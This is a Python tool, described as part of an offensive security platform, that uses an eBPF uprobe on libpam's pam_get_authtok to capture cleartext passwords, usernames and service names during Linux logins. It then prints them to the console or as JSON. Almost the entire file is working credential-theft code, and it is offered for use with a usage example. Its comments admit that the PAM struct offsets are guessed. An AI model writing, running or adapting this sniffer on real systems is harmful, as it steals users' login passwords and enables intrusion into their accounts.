#!/usr/bin/env python3
"""
pam_sniff.py - Capture PAM authentication credentials via eBPF uprobe.

Attaches a uprobe to pam_get_authtok in libpam.so to intercept cleartext
passwords during PAM authentication flows. Requires root privileges.

Part of CyberStrike offensive security platform.
"""

import argparse
import ctypes
import json
import os
import signal
import sys
import time
from datetime import datetime

BPF_PROGRAM = r"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

#define MAX_STR_LEN 256

struct pam_event_t {
    u64 timestamp_ns;
    u32 pid;
    u32 uid;
    char comm[TASK_COMM_LEN];
    char username[MAX_STR_LEN];
    char password[MAX_STR_LEN];
    char service[MAX_STR_LEN];
};

BPF_PERF_OUTPUT(pam_events);

// pam_handle_t partial layout — we read the authtok (password), user, and
// service_name fields. These offsets are stable across libpam versions on
// Linux x86_64 (pam_handle opaque struct from Linux-PAM source).
//
// struct pam_handle {
//     char *authtok;          // offset 0
//     unsigned caller_is;     // offset 8
//     void *pam_conversation; // offset 16
//     char *authtok_type;     // offset 24  (unused here)
//     ...
//     char *service_name;     // offset 40  (varies; we read from pamh)
//     char *user;             // offset 48
//     ...
// };
//
// The exact offsets depend on the PAM build, so we read the user pointer
// from the pamh struct passed as arg0 to pam_get_authtok.

// We hook the return of pam_get_authtok to capture the password after
// it has been written. We store the pamh pointer on entry and read
// the authtok pointer on return.

BPF_HASH(pamh_map, u32, u64);

// Entry probe: pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char *prompt)
int trace_pam_get_authtok_entry(struct pt_regs *ctx) {
    u64 pamh = (u64)PT_REGS_PARM1(ctx);
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    pamh_map.update(&pid, &pamh);
    return 0;
}

// Return probe: read the authtok that was set
int trace_pam_get_authtok_return(struct pt_regs *ctx) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u64 *pamh_ptr = pamh_map.lookup(&pid);
    if (!pamh_ptr)
        return 0;

    u64 pamh = *pamh_ptr;
    pamh_map.delete(&pid);

    int ret = PT_REGS_RC(ctx);
    if (ret != 0)
        return 0;  // PAM_SUCCESS == 0

    struct pam_event_t event = {};
    event.timestamp_ns = bpf_ktime_get_ns();
    event.pid = pid;
    event.uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));

    // Read the authtok (password) pointer from pamh->authtok (offset 0)
    // In Linux-PAM, the authtok is stored in the pam_handle_t struct.
    // pam_get_authtok stores the result in the third parameter, but
    // it also caches it in pamh. We read it from the pamh struct.
    u64 authtok_ptr = 0;
    bpf_probe_read_user(&authtok_ptr, sizeof(authtok_ptr), (void *)pamh);
    if (authtok_ptr) {
        bpf_probe_read_user_str(&event.password, sizeof(event.password), (void *)authtok_ptr);
    }

    // Read the user pointer from pamh (typically offset 48 on 64-bit)
    // This offset may vary; common offsets: 40 or 48
    u64 user_ptr = 0;
    bpf_probe_read_user(&user_ptr, sizeof(user_ptr), (void *)(pamh + 48));
    if (user_ptr) {
        bpf_probe_read_user_str(&event.username, sizeof(event.username), (void *)user_ptr);
    }

    // Read the service name from pamh (typically offset 40 on 64-bit)
    u64 service_ptr = 0;
    bpf_probe_read_user(&service_ptr, sizeof(service_ptr), (void *)(pamh + 40));
    if (service_ptr) {
        bpf_probe_read_user_str(&event.service, sizeof(event.service), (void *)service_ptr);
    }

    pam_events.perf_submit(ctx, &event, sizeof(event));
    return 0;
}
"""

TASK_COMM_LEN = 16
MAX_STR_LEN = 256


class PamEvent(ctypes.Structure):
    _fields_ = [
        ("timestamp_ns", ctypes.c_uint64),
        ("pid", ctypes.c_uint32),
        ("uid", ctypes.c_uint32),
        ("comm", ctypes.c_char * TASK_COMM_LEN),
        ("username", ctypes.c_char * MAX_STR_LEN),
        ("password", ctypes.c_char * MAX_STR_LEN),
        ("service", ctypes.c_char * MAX_STR_LEN),
    ]


class PamSniffer:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.bpf = None

    def check_root(self):
        if os.geteuid() != 0:
            print("ERROR: pam_sniff.py requires root privileges. Run with sudo.", file=sys.stderr)
            sys.exit(1)

    def find_libpam(self):
        """Locate libpam.so on the system."""
        import subprocess
        candidates = [
            "/lib/x86_64-linux-gnu/libpam.so.0",
            "/lib64/libpam.so.0",
            "/usr/lib/libpam.so.0",
            "/usr/lib64/libpam.so.0",
            "/lib/libpam.so.0",
        ]
        for path in candidates:
            if os.path.exists(path):
                return path
        # Fallback: use ldconfig
        try:
            result = subprocess.run(
                ["ldconfig", "-p"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                if "libpam.so" in line and "=>" in line:
                    return line.split("=>")[-1].strip()
        except Exception:
            pass
        print("ERROR: Could not locate libpam.so on this system.", file=sys.stderr)
        sys.exit(1)

    def print_banner(self):
        libpam_path = self.find_libpam()
        print("=" * 70)
        print("  pam_sniff.py - PAM Credential Sniffer (eBPF)")
        print("=" * 70)
        print(f"  PID:         {os.getpid()}")
        print(f"  libpam:      {libpam_path}")
        print(f"  JSON output: {self.args.json_output}")
        if self.args.duration:
            print(f"  Duration:    {self.args.duration}s")
        else:
            print("  Duration:    unlimited (Ctrl+C to stop)")
        print("=" * 70)
        print()
        self._libpam_path = libpam_path

    def signal_handler(self, signum, frame):
        self.running = False

    def handle_event(self, cpu, data, size):
        event = ctypes.cast(data, ctypes.POINTER(PamEvent)).contents
        self.event_count += 1

        timestamp = datetime.now().isoformat()
        comm = event.comm.decode("utf-8", errors="replace").rstrip("\x00")
        username = event.username.decode("utf-8", errors="replace").rstrip("\x00")
        password = event.password.decode("utf-8", errors="replace").rstrip("\x00")
        service = event.service.decode("utf-8", errors="replace").rstrip("\x00")

        if self.args.json_output:
            record = {
                "timestamp": timestamp,
                "pid": event.pid,
                "uid": event.uid,
                "comm": comm,
                "username": username,
                "password": password,
                "service": service,
            }
            print(json.dumps(record), flush=True)
        else:
            print(
                f"[{timestamp}] PID={event.pid} UID={event.uid} "
                f"COMM={comm} SERVICE={service} "
                f"USER={username} PASS={password}",
                flush=True,
            )

    def run(self):
        self.check_root()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        from bcc import BPF

        self.bpf = BPF(text=BPF_PROGRAM)

        # Attach uprobes to pam_get_authtok
        self.bpf.attach_uprobe(
            name=self._libpam_path,
            sym="pam_get_authtok",
            fn_name="trace_pam_get_authtok_entry",
        )
        self.bpf.attach_uretprobe(
            name=self._libpam_path,
            sym="pam_get_authtok",
            fn_name="trace_pam_get_authtok_return",
        )

        self.bpf["pam_events"].open_perf_buffer(self.handle_event)

        print("Tracing PAM authentication... Hit Ctrl+C to stop.\n")
        if not self.args.json_output:
            print(
                f"{'TIMESTAMP':<28} {'PID':<8} {'UID':<8} "
                f"{'COMM':<16} {'SERVICE':<16} {'USER':<20} {'PASS'}"
            )
            print("-" * 120)

        self.start_time = time.monotonic()

        while self.running:
            try:
                self.bpf.perf_buffer_poll(timeout=100)
            except KeyboardInterrupt:
                self.running = False
                break

            if self.args.duration:
                elapsed = time.monotonic() - self.start_time
                if elapsed >= self.args.duration:
                    break

        self.cleanup()

    def cleanup(self):
        print(f"\n--- pam_sniff summary ---")
        print(f"Captured {self.event_count} credential event(s)")
        if self.start_time:
            elapsed = time.monotonic() - self.start_time
            print(f"Duration: {elapsed:.1f}s")
        if self.bpf:
            self.bpf.cleanup()
        print("Probes detached. Exiting.")


def main():
    parser = argparse.ArgumentParser(
        description="Capture PAM authentication credentials via eBPF uprobe on pam_get_authtok.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example:\n  sudo python3 pam_sniff.py --json-output --duration 60",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output captured credentials as JSON objects (one per line)",
    )
    parser.add_argument(
        "--duration",
        type=int,
        default=None,
        metavar="SECONDS",
        help="Run for specified duration in seconds, then exit",
    )
    args = parser.parse_args()

    sniffer = PamSniffer(args)
    sniffer.run()


if __name__ == "__main__":
    main()
